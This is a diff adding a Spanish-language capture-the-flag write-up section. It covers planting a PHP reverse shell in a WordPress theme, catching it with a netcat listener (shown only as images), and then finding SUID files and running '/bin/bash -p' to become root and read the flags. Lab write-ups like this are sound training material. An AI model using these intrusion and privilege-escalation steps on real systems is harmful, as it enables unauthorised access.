@@ -105,6 +105,59 @@ Probamos a utilizar esas credenciales para acceder al panel de Wordpress:
 
 Con este acceso, ya podemos crear una PHP Reverse Shell en uno de los temas y con ello acceder al sistema:
 
+![image](https://github.com/user-attachments/assets/262c4cb3-942d-4fb8-94ee-dad037825391)
 
+Activamos el listener en nc:
+
+![image](https://github.com/user-attachments/assets/b2e7f312-e483-4180-8d53-173599d07d8c)
+
+Y accedemos a la web... ¡obtenemos acceso al sistema!
+
+![image](https://github.com/user-attachments/assets/20e5ce8b-3a58-4752-89c6-0897a5fa7cfb)
+
+Pero para acceder a la flag de usuario, necesitamos cambiar de usuario, ya que somos www-data y necesitamos ser mínimo el usuario elyana.
+Vamos a ver si podemos escalar privilegios directamente y desde root acceder a las dos flags.
 
 # Privilege escalation
+
+Comenzamos haciendo la enumeración básica de ficheros con permisos SUID:
+
+    bash-4.4$ find / -perm /4000 2>/dev/null
+    find / -perm /4000 2>/dev/null
+    /bin/mount
+    /bin/ping
+    /bin/fusermount
+    /bin/su
+    /bin/bash
+    /bin/chmod
+    /bin/umount
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+    /usr/lib/snapd/snap-confine
+    /usr/lib/policykit-1/polkit-agent-helper-1
+    /usr/bin/newuidmap
+    /usr/bin/pkexec
+    /usr/bin/lxc
+    /usr/bin/traceroute6.iputils
+    /usr/bin/newgidmap
+    /usr/bin/chfn
+    /usr/bin/chsh
+    /usr/bin/newgrp
+    /usr/bin/sudo
+    /usr/bin/socat
+    /usr/bin/gpasswd
+    /usr/bin/at
+    /usr/bin/passwd
+
+Vemos un fichero interesante con el cual la escalada de privilegios es simple. Ese fichero es /bin/bash. Lo ejecutamos tal cual, y con eso ya somos root:
+
+    bash-4.4$ /bin/bash -p
+    /bin/bash -p
+    bash-4.4# whoami
+    whoami
+    root
+    bash-4.4#
+
+Y ya desde root podemos acceder a la flag de user.txt en /home/elyana/user.txt y la de root en /root/root.txt
